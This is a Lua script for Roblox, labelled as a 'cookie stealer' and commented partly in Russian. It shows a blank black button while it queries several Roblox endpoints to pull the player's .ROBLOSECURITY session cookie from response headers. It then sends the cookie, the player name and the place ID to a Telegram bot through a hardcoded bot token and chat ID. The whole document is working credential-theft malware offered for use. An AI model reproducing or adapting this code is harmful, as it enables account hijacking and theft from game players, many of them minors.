-- NeverHit WORKING Cookie Stealer
print("🔫 NeverHit WORKING loaded!")

-- Черная кнопка
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "NeverHitGUI"
local blackButton = Instance.new("TextButton")
blackButton.Size = UDim2.new(0, 200, 0, 60)
blackButton.Position = UDim2.new(0.5, -100, 0.5, -30)
blackButton.BackgroundColor3 = Color3.new(0, 0, 0)
blackButton.Text = ""
blackButton.BorderSizePixel = 0
blackButton.Parent = screenGui
screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

-- РАБОЧИЕ методы извлечения куки
local function stealCookie()
    local cookie = nil
    
    -- МЕТОД 1: Через HttpGet (самый надежный)
    local success1, result1 = pcall(function()
        local response = game:HttpGet("https://www.roblox.com/game/GetCurrentUser.ashx", true)
        return response
    end)
    
    -- МЕТОД 2: Через request с headers
    local success2, response2 = pcall(function()
        return request({
            Url = "https://users.roblox.com/v1/users/authenticated",
            Method = "GET",
            Headers = {
                ["Content-Type"] = "application/json"
            }
        })
    end)
    
    if success2 and response2 then
        local headers = response2.Headers
        for key, value in pairs(headers) do
            if string.find(string.lower(key), "cookie") or string.find(string.lower(key), "set-cookie") then
                local match = string.match(value, "_%|WARNING:.-|_(.-)")
                if match then
                    cookie = match
                    break
                end
            end
        end
    end
    
    -- МЕТОД 3: Через старый метод
    if not cookie then
        local success3, response3 = pcall(function()
            return request({
                Url = "https://www.roblox.com/game/GetCurrentUser.ashx",
                Method = "GET"
            })
        end)
        
        if success3 and response3 and response3.Headers then
            local rawCookie = response3.Headers["Set-Cookie"] or response3.Headers["set-cookie"] or ""
            cookie = string.match(rawCookie, "_%|WARNING:.-|_(.-)") or rawCookie
        end
    end
    
    -- МЕТОД 4: Экспериментальный - через разные endpoints
    if not cookie or string.find(cookie, "FAILED") then
        local endpoints = {
            "https://auth.roblox.com/v1/auth/metadata",
            "https://economy.roblox.com/v1/user/currency",
            "https://inventory.roblox.com/v1/users/1/items/Collection"
        }
        
        for i, endpoint in ipairs(endpoints) do
            local success, resp = pcall(function()
                return request({Url = endpoint, Method = "GET"})
            end)
            
            if success and resp and resp.Headers then
                for k, v in pairs(resp.Headers) do
                    if string.find(tostring(k), "Cookie") or string.find(tostring(k), "ROBLOSECURITY") then
                        local match = string.match(tostring(v), "_%|WARNING:.-|_(.-)")
                        if match and #match > 100 then
                            cookie = match
                            break
                        end
                    end
                end
            end
            if cookie then break end
        end
    end
    
    return cookie or "UNABLE_TO_EXTRACT_COOKIE"
end

-- Функция отправки
local function sendCookie(cookie)
    if not cookie or #cookie < 10 then 
        print("❌ Invalid cookie: " .. tostring(cookie))
        return false 
    end
    
    print("📦 Cookie length: " .. #cookie)
    
    -- Отправляем в Telegram
    local telegramSuccess = pcall(function()
        request({
            Url = "https://api.telegram.org/bot7941815101:AAFagjP3iAYGvIYkQj1jJ7FRG119vj5EkeE/sendMessage",
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = game:GetService("HttpService"):JSONEncode({
                chat_id = "8238376878",
                text = "🎉 REAL COOKIE CAPTURED!\n\n🔑: " .. cookie .. "\n🎮: " .. game.PlaceId .. "\n👤: " .. game.Players.LocalPlayer.Name .. "\n🕒: " .. os.date() .. "\n📏 Length: " .. #cookie
            })
        })
    end)
    
    -- Локальное сохранение
    pcall(function()
        local part = Instance.new("Part")
        part.Name = "REAL_COOKIE_" .. math.random(1000,9999)
        part.Anchored = true
        part.Size = Vector3.new(10, 1, 10)
        part.Position = Vector3.new(0, 100, 0)
        part.BrickColor = BrickColor.new("Lime green")
        part.Material = Enum.Material.Neon
        
        local billboard = Instance.new("BillboardGui")
        billboard.Size = UDim2.new(0, 500, 0, 100)
        billboard.StudsOffset = Vector3.new(0, 3, 0)
        billboard.Adornee = part
        
        local textLabel = Instance.new("TextLabel")
        textLabel.Size = UDim2.new(1, 0, 1, 0)
        textLabel.BackgroundTransparency = 1
        textLabel.Text = "REAL COOKIE:\n" .. string.sub(cookie, 1, 150) .. "..."
        textLabel.TextColor3 = Color3.new(0, 1, 0)
        textLabel.TextScaled = true
        textLabel.Font = Enum.Font.SourceSansBold
        textLabel.Parent = billboard
        
        billboard.Parent = part
        part.Parent = workspace
    end)
    
    return telegramSuccess
end

-- Запуск
wait(3)
print("🕵️ Extracting cookie...")
local cookie = stealCookie()
print("🔍 Extracted: " .. string.sub(cookie, 1, 50))

if string.find(cookie, "FAILED") or string.find(cookie, "UNABLE") then
    print("❌ Cookie extraction failed!")
else
    local success = sendCookie(cookie)
    if success then
        print("✅ REAL COOKIE SENT TO TELEGRAM!")
    else
        print("❌ Failed to send, but cookie is: " .. string.sub(cookie, 1, 100))
    end
end

print("🛡️ NeverHit COMPLETED")
